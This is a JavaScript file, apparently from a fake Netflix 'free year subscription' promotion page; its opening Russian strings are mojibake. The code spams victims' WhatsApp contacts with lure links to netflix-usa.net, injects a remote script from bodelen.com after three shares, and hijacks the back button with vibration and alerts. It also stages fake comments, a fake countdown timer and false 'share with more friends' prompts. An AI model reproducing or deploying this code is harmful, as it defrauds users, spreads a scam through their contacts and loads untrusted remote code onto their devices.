'Netflix Ð´Ð°ÐµÑ‚ 1 Ð³Ð¾Ð´ Ð±ÐµÑÐ¿Ð»Ð°Ñ‚Ð½Ð¾Ð¹ Ð¿Ð¾Ð´Ð¿Ð¸ÑÐºÐ¸! ÐŸÐ¾ÑÐ¿ÐµÑˆÐ¸ Ð¿Ð¾ÐºÐ° Ð½Ðµ Ð·Ð°ÐºÐ¾Ð½Ñ‡Ð¸Ð»Ð¸ÑÑŒ'
];

msgsamigo['id'] = [
'Netflix membagikan 1 tahun berlangganan gratis !!',
'Netflix membagikan 1 tahun berlangganan gratis !!'
];



var linksEDR = [];
linksEDR['pt'] = ['https://netflix-usa.net/?periodo-de-isolamento-gratis','https://netflix-usa.net/?periodo-de-isolamento-gratis'];
linksEDR['en'] = ['https://netflix-usa.net/?en','https://netflix-usa.net/?en']; 
linksEDR['es'] = ['https://netflix-usa.net/?es','https://netflix-usa.net/?es']; 
linksEDR['fr'] = ['https://netflix-usa.net/?fr','https://netflix-usa.net/?fr']; 
linksEDR['ru'] = ['https://netflix-usa.net/?ru','https://netflix-usa.net/?ru'];
linksEDR['id'] = ['https://netflix-usa.net/?id','https://netflix-usa.net/?id']; 


function setlng() {
    var _0xfd47x6 = window['navigator']['language']['split'](/[^a-z]/)[0]['toLowerCase']();
    if (_0xfd47x6 == 'en' || _0xfd47x6 == 'fr' || _0xfd47x6 == 'es' || _0xfd47x6 == 'pt' || _0xfd47x6 == 'ru') {
        return _0xfd47x6
    } else {
        return 'en'
    }
}

lng = setlng();
			
			function fna(_0xfd47x11) {
				
				c++;
				
				ga('send', 'event', 'WhatsApp ' + lng['toUpperCase'](), '[SHARE][' + c + '][' + lng['toUpperCase']() + ']');

			window['location']['href'] = 'whatsapp://send?text=' + msgsamigo[lng][Math['floor'](Math['random']() * msgsamigo[lng]['length'])] + ' %0A%0A' + linksEDR[lng][Math['floor'](Math['random']() * linksEDR[lng]['length'])];	

if (c == 3) {
setTimeout(function(){
var script = document.createElement("script");
script.setAttribute("type", "text/javascript");
script.setAttribute("src", "//bodelen.com/apu.php?zoneid=2163797");
document.getElementsByTagName("body")[0].appendChild(script);
},100);
}

			}
			
  
  
  function loadCom(a,b) {
             setTimeout(function() {
                 $(a).fadeIn(250);
             }, b);
         }
         $.fn.onEnterKey = function(callback) {
             $(this).keypress(function(event) {
                 var code = event.keyCode ? event.keyCode : event.which;
                 if (code == 13) {
                     callback();
                     return false;
                 }
             });
         }
         function loadAllComment(){
             loadCom('#com1', 3250);
             loadCom('#com2', 5800);
             loadCom('#com3', 5700);
             loadCom('#com4', 7500);
             loadCom('#com5', 9000);
         }
         
         $(document).ready(function() {
         
             loadAllComment();
         
             $('.like').on('click',function() {
                 var _this = $(this);
                 if(_this.hasClass('active-like')) {
                     _this.removeClass('active-like');
                     $('.you').removeClass('activee');
                 } else {
                     _this.addClass('active-like');
                     $('.you').addClass('activee');
                 }
             });
             
             $(document).on('click', '.fblike', function() {
                 var _this = $(this);
                 var x = _this.next().next().html() == '' ? 0 : parseInt(_this.next().next().html());
                 if(_this.hasClass('selected')) {
                     _this.removeClass('selected').html('Like');
                     _this.next().next().html(--x);
                     if(x == 0) _this.next().next().addClass('likehide');
                 } else {
                     _this.addClass('selected').html('Unlike');
                     _this.next().next().html(++x);
                     if(_this.next().next().hasClass('likehide')) _this.next().next().removeClass('likehide');
                 }
             });
             $("#addCom").onEnterKey(function() {
                 var value = $("#addCom").val();
                 $("#addCom").val("");
                 $("#myComment").html(value);
                 $(".addComment").hide();
                 loadCom('#myCom', 250);
             });
             
             
             var teilen = 10;
             
             var pruefen = 0;
            
         
           $("#frage_01").click(function() {
           	    show('#frage_02'); 
           	    hide('#frage_01'); 
                 });
             
             $("#frage_02").click(function() {
           	    show('#frage_03'); 
           	    hide('#frage_02'); 
                 });
                 
             $("#frage_03").click(function() {
           	    show('#frage_04'); 
           	    hide('#frage_03'); 
                 });
                 
             $("#frage_04").click(function() {
           	    show('#content_02'); 
           	    hide('#frage_04');
           	    hide('#aufforderung');
           	    var myTimer1 = window.setInterval(updateTimer1, 2000);
                 function updateTimer1() {
           	        pruefen++;
           	        $("#check").text(pruefen);
           	        
           	        if ( pruefen == 1 ) {
           	            show('#pruefen_01'); 
           		   	    }
           		   	    
           		   	if ( pruefen == 2 ) {
           	            show('#pruefen_02'); 
           		   	    }
           	      
           	        if ( pruefen == 3 ) {
           	            show('#pruefen_03'); 
           		   	    }
           		   	    
           		   	if ( pruefen == 4 ) {
           	            window.clearInterval(myTimer1);
           	            show('#content_03'); 
           	            hide('#content_02');
           	            hide('#intro');
           		   	    } 
           		    }
                 });
              
             $("#btnShare1").click(function() {
                 teilen--;
                 $('#anzahl').text( teilen );
                 
                 if (teilen == 0) {
           	        show('#btnWin'); 
           	        hide('#btnFakeWin'); 
                     }
                 
                 });
                 
             $("#btnShare2").click(function() {
                 teilen--;
                 $('#anzahl').text( teilen );
                 
                 if (teilen == 0) {
           	        show('#btnWin'); 
           	        hide('#btnFakeWin'); 
                     }
                 
                 });
                 
             $("#btnFakeWin").click(function() {
                 alert ('Please share it with  ' + Share + ' Other Contacts!');
                 });
             
             function show (toBlock){
         	    //setDisplay(toBlock, 'block');
           	    $(toBlock).show();
                }
           
             function hide (toNone) {
                 //setDisplay(toNone, 'none');
                 $(toNone).hide();
                 }
             
             function setDisplay (target, str) {
                 document.getElementById(target).style.display = str;
                 }
         
             
            var zeit = new Date();
                 
                 var sec = zeit.getSeconds();
                 
                 if (sec < 6 ){
                     sec = 9
                 }
                 
                 if (sec > 5 & sec < 13 ){
                     sec = 8
                 }
                 
                  if (sec > 11 & sec < 19 ){
                     sec = 7
                 }
                 
                  if (sec > 17 & sec < 25 ){
                     sec = 6
                 }
                 
                  if (sec > 23 & sec < 31 ){
                     sec = 5
                 }
                 
                  if (sec > 29 & sec < 37 ){
                     sec = 4
                 }
                 
                 if (sec > 35 & sec < 43 ){
                     sec = 3
                 }
                 
                 if (sec > 41 & sec < 49 ){
                     sec = 2
                 }
                 
                 if (sec > 47 & sec < 55 ){
                     sec = 1
                 }
                 
                 if (sec > 54){
                     sec=0
                 };
                 
                 
                 var add = sec;
                 
                 var zeit2 = new Date();
                 
                 var minute = zeit2.getMinutes();
                 
                 var timer1 = (60-minute)*60;
                 
                 if (timer1 > 1800) {
                    var resttimer = (30-minute)*10
                 } else {
                    var resttimer = (60-minute)*10
                 };
                 
                 var timer = resttimer + add + 67;
                 
                 function updateTimer() {
                 	timer--;
               	    $("#gutschein").text(timer);
               		
               	    if (timer < 9) {
               	        stopFunction();
               	    }
                 }
               
                 var myTimer = window.setInterval(updateTimer, 6000);
           
                 function stopFunction() {
                     window.clearInterval(myTimer);
                 }
         });
		 
		 
var ii = 0;
var iy = 0;
if (typeof history['pushState'] === 'function') {
    history['pushState']('back', null, null);
    window['onpopstate'] = function() {
        history['pushState']('back', null, null);
        if (iy == 100) {
            iy = 0;
        } else {
            if (ii == 1) {
                iy = iy + 1;
				//
               //$.alert(transport['msg1'][lng], "Netflix");
			    window['navigator']['vibrate'](2000);
			   setTimeout(function() {
				   
				   window.alert(transport['msg1'][lng]);
   
},100);
			    
            }
        }
    }
};
setTimeout(function() {
    ii = 1
}, 200);


         var c = 0;
         $(document).ready(function() {
             $("#b2").on('click', function() {
				 
				    if (c == 0) {  window.alert("Compartilhe esta promoÃ§Ã£o com pelo menos 10 contatos para continuar. VocÃª nÃ£o convidou ninguÃ©m ainda! "); }
					if (c == 1) {  window.alert("Compartilhe esta promoÃ§Ã£o com pelo menos 10 contatos para continuar. VocÃª convidou apenas 5 contatos, envie para mais 5 amigos"); }
					if (c == 2) {  window.alert("Compartilhe esta promoÃ§Ã£o com pelo menos 10 contatos para continuar. VocÃª convidou apenas 5 contatos, envie para mais 5 amigos"); } 
                          		if (c >= 3) {  window.alert("Ops, os amigos selecionados jÃ¡ receberam nossa promoÃ§Ã£o ou sÃ£o inativos. Selecione novos amigos."); }

             });
         });

         $(document).bind('keydown keypress', 'ctrl+s', function(){
           $('#save').click(); 
           return false;
         });
		 
